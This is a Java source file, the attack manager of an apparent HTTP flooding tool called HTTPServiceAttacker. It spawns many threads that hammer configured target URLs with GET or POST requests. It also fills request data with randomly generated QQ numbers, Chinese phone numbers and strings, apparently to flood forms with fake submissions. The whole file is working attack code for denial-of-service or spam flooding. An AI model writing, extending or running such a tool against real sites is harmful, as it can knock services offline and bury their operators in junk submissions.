package com.ishland.app.HTTPServiceAttacker.attacker;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.http.HeaderElement;
import org.apache.http.HeaderElementIterator;
import org.apache.http.HttpResponse;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.conn.ConnectionKeepAliveStrategy;
import org.apache.http.impl.DefaultConnectionReuseStrategy;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
import org.apache.http.message.BasicHeaderElementIterator;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.ishland.app.HTTPServiceAttacker.attacker.threads.AttackerThread;
import com.ishland.app.HTTPServiceAttacker.attacker.threads.MonitorThread;
import com.ishland.app.HTTPServiceAttacker.configuration.Configuration;

public class Attack {

    private static Configuration config = null;
    private static ArrayList<AttackerThread> thrs = new ArrayList<>();
    private static MonitorThread monitorThread = null;
    private static final Logger logger = LogManager.getLogger("Attack manager");
    private static PoolingHttpClientConnectionManager cm = null;
    public static CloseableHttpClient httpClient = null;

    public static void initClient(int threads) {
	cm = new PoolingHttpClientConnectionManager(30, TimeUnit.SECONDS);
	cm.setMaxTotal((int) (threads * 1.5));
	cm.setDefaultMaxPerRoute(cm.getMaxTotal());
	cm.setValidateAfterInactivity(2000);

	RequestConfig defaultRequestConfig = RequestConfig.custom().setConnectTimeout(4000).setSocketTimeout(4000)
		.setConnectionRequestTimeout(8000).build();

	ConnectionKeepAliveStrategy myStrategy = new ConnectionKeepAliveStrategy() {
	    @Override
	    public long getKeepAliveDuration(HttpResponse response, HttpContext context) {
		HeaderElementIterator it = new BasicHeaderElementIterator(
			response.headerIterator(HTTP.CONN_KEEP_ALIVE));
		while (it.hasNext()) {
		    HeaderElement he = it.nextElement();
		    String param = he.getName();
		    String value = he.getValue();
		    if (value != null && param.equalsIgnoreCase("timeout")) {
			return Long.parseLong(value) * 1000;
		    }
		}
		return 60 * 1000;// 如果没有约定，则默认定义时长为60s
	    }
	};
	httpClient = HttpClients.custom().setConnectionReuseStrategy(new DefaultConnectionReuseStrategy())
		.setKeepAliveStrategy(myStrategy).setDefaultRequestConfig(defaultRequestConfig).setConnectionManager(cm)
		.build();
    }

    public static void startAttack() throws IllegalAccessException {
	logger.info("Starting attack...");
	if (getConfig() == null)
	    throw new IllegalAccessException("Configuration is not set!");
	monitorThread = new MonitorThread();
	monitorThread.start();
	int totalthreads = 0;
	for (int i = 0; i < getConfig().getTarget().size(); i++)
	    totalthreads += Integer.valueOf(String.valueOf(getConfig().getTarget().get(i).get("threads"))).intValue();
	Attack.initClient(totalthreads);
	Iterator<Map<String, Object>> itall = getConfig().getTarget().iterator();
	while (itall.hasNext()) {
	    Map<String, Object> itallmap = itall.next();
	    for (long i = 0; i < Long.valueOf(String.valueOf(itallmap.get("threads"))).longValue(); i++) {
		AttackerThread thr = new AttackerThread();
		if (itallmap.get("mode") == "POST")
		    thr.setMethod(AttackerThread.POST);
		else
		    thr.setMethod(AttackerThread.GET);
		thr.setTarget(String.valueOf(itallmap.get("addr")));
		thr.setData(String.valueOf(itallmap.get("data")));
		thr.setShowExceptions(getConfig().isShowExceptions());
		thr.setReferer(String.valueOf(itallmap.get("referer")));
		thr.start();
		thrs.add(thr);
		thr = null;
	    }
	    itallmap = null;
	}
	itall = null;
	logger.info("Attack started.");
    }

    public static void stopAttack() {
	logger.info("Sending stop signal to all attacker threads...");
	Iterator<AttackerThread> it = thrs.iterator();
	while (it.hasNext())
	    it.next().stopTask();
	it = null;
	logger.info("Waiting for all the threads to die...");
	it = thrs.iterator();
	while (it.hasNext()) {
	    AttackerThread thr = it.next();
	    try {
		thr.join();
	    } catch (InterruptedException e) {
		logger.warn("Could not wait for " + thr.getName() + " to die", e);
	    }
	    thr = null;
	}
	it = null;
	try {
	    httpClient.close();
	    cm.close();
	} catch (IOException e1) {
	}
	httpClient = null;
	cm = null;
	monitorThread.stopTask();
	try {
	    monitorThread.join();
	} catch (InterruptedException e) {
	    logger.warn("Could not wait for Monitor Thread to die", e);
	}
	monitorThread = null;
	logger.info("Attack stopped.");
    }

    public static String replacePlaceHolders(String origin) {
	String result = new String(origin);
	result = result.replaceAll("\\[QQ\\]", RandomStringUtils.randomNumeric(5, 10));
	result = result.replaceAll("\\[86Phone\\]", "1" + RandomStringUtils.randomNumeric(10));
	for (int i = 1; i <= 32; i++) {
	    result = result.replaceAll("\\[Ascii_" + String.valueOf(i) + "\\]", RandomStringUtils.randomAscii(i));
	    result = result.replaceAll("\\[Number_" + String.valueOf(i) + "\\]", RandomStringUtils.randomNumeric(i));
	    result = result.replaceAll("\\[Alpha_" + String.valueOf(i) + "\\]", RandomStringUtils.randomAlphabetic(i));
	    result = result.replaceAll("\\[NumAlp_" + String.valueOf(i) + "\\]",
		    RandomStringUtils.randomAlphanumeric(i));
	}
	return result;
    }

    /**
     * @return the config
     */
    public static Configuration getConfig() {
	return config;
    }

    /**
     * @param config the config to set
     */
    public static void setConfig(Configuration config) {
	Attack.config = config;
    }

}
